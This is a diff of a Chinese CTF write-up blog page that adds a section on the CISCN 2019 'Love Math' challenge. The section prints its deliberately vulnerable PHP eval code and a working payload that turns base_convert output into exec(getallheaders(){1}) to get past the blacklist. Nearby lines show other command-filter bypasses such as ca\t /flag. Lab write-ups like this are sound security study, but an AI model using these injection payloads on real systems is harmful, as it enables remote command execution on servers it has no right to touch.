@@ -23,17 +23,17 @@
   <meta name="description" content="BUUCTF 2018 Online Tool123456789101112131415161718&lt;?phpif (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &amp;#123;    $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]">
 <meta property="og:type" content="article">
 <meta property="og:title" content="buu33-40">
-<meta property="og:url" content="https://jingdaqiang.github.io/2021/03/15/buu33-40/index.html">
+<meta property="og:url" content="https://jingdaqiang.github.io/2021/03/15/buu33-48/index.html">
 <meta property="og:site_name" content="Daq1ang">
 <meta property="og:description" content="BUUCTF 2018 Online Tool123456789101112131415161718&lt;?phpif (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &amp;#123;    $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-03-15T11:50:36.000Z">
-<meta property="article:modified_time" content="2021-03-19T03:52:51.405Z">
+<meta property="article:modified_time" content="2021-04-21T02:37:24.037Z">
 <meta property="article:author" content="六公子买单">
 <meta property="article:tag" content="二刷buu">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://jingdaqiang.github.io/2021/03/15/buu33-40/">
+<link rel="canonical" href="https://jingdaqiang.github.io/2021/03/15/buu33-48/">
 
 
 <script id="page-configurations">
@@ -151,7 +151,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/15/buu33-40/">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/15/buu33-48/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -181,7 +181,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-19 11:52:51" itemprop="dateModified" datetime="2021-03-19T11:52:51+08:00">2021-03-19</time>
+                <time title="Modified: 2021-04-21 10:37:24" itemprop="dateModified" datetime="2021-04-21T10:37:24+08:00">2021-04-21</time>
               </span>
 
           
@@ -242,6 +242,19 @@
 
 b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre>
 <p>然后利用cmd指令找flag，查目录，过滤了ls，可以用dir(也可以用l\s绕过过滤 )，查看根目录dir /发现有flag，用ca\t /flag绕过过滤查看flag.</p>
+<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    &#x2F;&#x2F;例子 c&#x3D;20-1</span><br><span class="line">    $content &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if (strlen($content) &gt;&#x3D; 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp</span><br><span class="line">    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span><br><span class="line">    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;帮你算出答案</span><br><span class="line">    eval(&#39;echo &#39;.$content.&#39;;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>要求：</p>
+<p>传参c长度不超过80</p>
+<p>payload中不能包含’ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘“‘, ‘`’, ‘[‘, ‘]’ 这些字符</p>
+<p>payload中不能有不是$whitelist白名单里面的单词出现</p>
+<p>php概念：把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘ls’);</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a&#x3D;&#39;system&#39;;</span><br><span class="line">$a(&#39;ls&#39;);</span><br></pre></td></tr></table></figure>
+<p>16进制就只有a-f字母，但是36进制包含所有小写字母，可以通过10进制纯数字转换成36进制字母来构造我们的payload，36进制 同样没有符号，不过符号可以通过异或去构造</p>
+<p>如果直接使用读取文件函数file_get_contents中包含下划线不在我们36进制中,并且base_convert第一个参数太长会溢出，也就是10进制数没法无限大。</p>
+<p>最后的方法是借助getallheader()来控制请求头，再通过添加请求头字段来读取flag.php</p>
+<p>getallheader()返回的是数组，要从数组里面取数据用array[‘xxx’],但是无奈[]被waf了,因为{}中是可以带数字的，这里用getallheader(){1}可以返回自定义头1里面的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">正常形式：</span><br><span class="line">?c&#x3D;exec(getallheaders()&#123;1&#125;)</span><br><span class="line">base_convert转换后：</span><br><span class="line">?c&#x3D;$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</span><br></pre></td></tr></table></figure>
+<p>(进制转换工具：<a target="_blank" rel="noopener" href="https://tool.oschina.net/hexconvert">https://tool.oschina.net/hexconvert</a>)</p>
 
     </div>
 
@@ -325,7 +338,7 @@ b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUCTF-2018-Online-Tool"><span class="nav-number">1.</span> <span class="nav-text">BUUCTF 2018 Online Tool</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Easy-Java"><span class="nav-number">2.</span> <span class="nav-text">[RoarCTF 2019]Easy Java</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="nav-number">3.</span> <span class="nav-text">[GXYCTF2019]禁止套娃</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="nav-number">4.</span> <span class="nav-text">[安洵杯 2019]easy_web</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUCTF-2018-Online-Tool"><span class="nav-number">1.</span> <span class="nav-text">BUUCTF 2018 Online Tool</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Easy-Java"><span class="nav-number">2.</span> <span class="nav-text">[RoarCTF 2019]Easy Java</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="nav-number">3.</span> <span class="nav-text">[GXYCTF2019]禁止套娃</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="nav-number">4.</span> <span class="nav-text">[安洵杯 2019]easy_web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math"><span class="nav-number">5.</span> <span class="nav-text">[CISCN 2019 初赛]Love Math</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81"><span class="nav-number">5.1.</span> <span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">5.2.</span> <span class="nav-text">代码分析</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -348,7 +361,7 @@ b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d
         <span class="site-state-item-name">categories</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-count">15</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
